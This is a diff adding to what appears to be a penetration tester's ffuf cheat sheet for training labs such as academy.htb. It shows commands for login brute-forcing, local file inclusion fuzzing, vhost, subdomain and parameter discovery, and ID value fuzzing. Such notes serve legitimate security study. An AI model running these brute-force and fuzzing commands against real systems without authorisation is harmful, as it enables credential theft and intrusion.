@@ -32,12 +32,12 @@ ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/
 ffuf -w usernames.txt:USER -w passwords.txt:PASS -H 'Content-Type: application/x-www-form-urlencoded' -u  http://10.10.84.8/login.php -d "username=USER&password=PASS" -fr "Please enter the correct credentials"
 ```
 
-# Local file inclusion
+# Local File Inclusion
 ```
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
 ```
 
-# VHOST enumeration
+# VHOST Enumeration
 ```
 ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
 ```
@@ -50,4 +50,33 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lower
 # Parameter Fuzzing
 ```
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+```
+
+# Subdomain Fuzzing
+```
+ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/
+```
+
+# VHOST Fuzzing
+```
+ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
+```
+
+# Filter Status
+```
+ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
+```
+
+# Value Fuzzing
+```
+for i in $(seq 1 1000); do echo $i >> ids.txt; done
+ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+```
+
+# Key Wordlists
+```
+/opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
+/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
 ```
